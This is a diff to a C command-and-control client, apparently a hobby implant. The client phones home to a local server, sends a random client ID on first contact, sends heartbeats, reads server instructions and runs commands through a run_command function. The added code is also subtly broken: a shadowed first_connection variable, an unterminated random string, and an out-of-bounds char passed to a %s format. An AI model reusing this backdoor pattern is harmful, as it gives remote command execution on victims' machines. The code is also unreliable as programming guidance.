@@ -4,20 +4,29 @@
 #include <arpa/inet.h>
 #include <unistd.h>
 #include <string.h>
+#include <time.h>
 
 //declaring functions
 char* run_command(char* command);
 int send_response(int sock, char *response);
 char * phone_home();
-
+char * client_id_generate();
 
 int main() {
     char * ph_value;
 
+    int first_connection = 0;
+
+    //client id
+
+    char * client_id = client_id_generate();
+
     while (1) {
         // phoning home
         printf("\nPhoning home\n");
-        ph_value = phone_home();
+        ph_value = phone_home(first_connection, client_id);
+
+        int first_connection = 1;
 
         //printf("ph_value = %s", ph_value);
 
@@ -47,7 +56,7 @@ int main() {
 
 }
 
-char * phone_home() {
+char * phone_home(int first_connection, char * client_id) {
     int sock = 0, valread;
     struct sockaddr_in serv_addr; //contains server address & port
     char *hello = "Hello from client"; //setting & creating pointer for hello variable
@@ -67,7 +76,7 @@ char * phone_home() {
 
     //here's that structure again, it's very similar to accessing a variable to another function in python (functionname.variable)
     serv_addr.sin_family = AF_INET;
-    serv_addr.sin_port = htons(8089);
+    serv_addr.sin_port = htons(8091);
        
     // convert IPv4 and IPv6 addresses from text to binary form
     if(inet_pton(AF_INET, "127.0.0.1", &serv_addr.sin_addr)<=0) { //does some conversion, not 100% the logic behind it
@@ -96,13 +105,24 @@ char * phone_home() {
     //printf("Hello message sent\n");
     //send_response(sock, hello);
     
+    //// initial Contact
+    printf("%i\n", first_connection);
+    if ( first_connection == 0 ) {
+        send_response(sock, client_id);
+        return "continue";
+    }
+
+    else {
+        // heartbeat, aka re connecting to server
+        send_response(sock, "heartbeat");
+
+        printf("Sending heartbeat");
+        valread = read(sock, buffer, 1024);
+
+        printf("BUFFER: %s\n", buffer);
+    }
+
     ///// Decision tree
-
-    // heartbeat, aka re connecting to server
-    send_response(sock, "heartbeat");
-    valread = read(sock, buffer, 1024);
-
-    printf("BUFFER: %s\n", buffer);
 
     if ( buffer == NULL ) {
         printf("Server Connected, but no instructions");
@@ -212,21 +232,23 @@ char* run_command(char* command) {
     return buffer;
 }
 
-/*
-int run_command(char *command) {
-    FILE* pipe = popen("ls", "r");
+char * client_id_generate() {
+    // seed the random number generator with the current time
+    srand(time(NULL));
 
-    if (!pipe) {
-        perror("popen failed");
-        return -1;
+
+    // adding a spot in memory for this variable, as it will vanish otherwise (on return) if not allocated
+    char* random_string = malloc(sizeof(char) * 6);
+
+    for (int i = 0; i < 5; i++) {
+        int random_number = rand() % 26;
+        random_string[i] = 'A' + random_number;
     }
+    //random_string[5] = '\0';
+    
+    // print the random string
+    printf("Random string: %s\n", random_string[6]);
+    
+    return random_string;
 
-    char buffer[1024];
-    while (fgets(buffer, sizeof(buffer), pipe)) {
-        printf("%s", buffer);
-    }
-
-    pclose(pipe);
-    return 0;
-
-}*/
+}
